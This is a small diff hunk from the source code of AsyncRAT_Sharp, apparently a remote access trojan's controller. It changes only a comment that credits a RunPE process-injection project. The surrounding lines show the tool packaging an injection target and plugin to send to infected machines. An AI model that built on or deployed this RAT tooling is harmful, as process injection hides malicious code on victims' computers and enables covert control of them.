@@ -499,7 +499,7 @@ namespace AsyncRAT_Sharp
                         {
                             msgpack.ForcePathObject("Inject").AsString = formSend.comboBox2.Text;
                             msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.Plugin);
-                            // github.com/gigajew/WinXRunPE-x86_x64
+                            // github.com/Artiist/RunPE-Process-Protection
                         }
 
                         foreach (ListViewItem itm in listView1.SelectedItems)
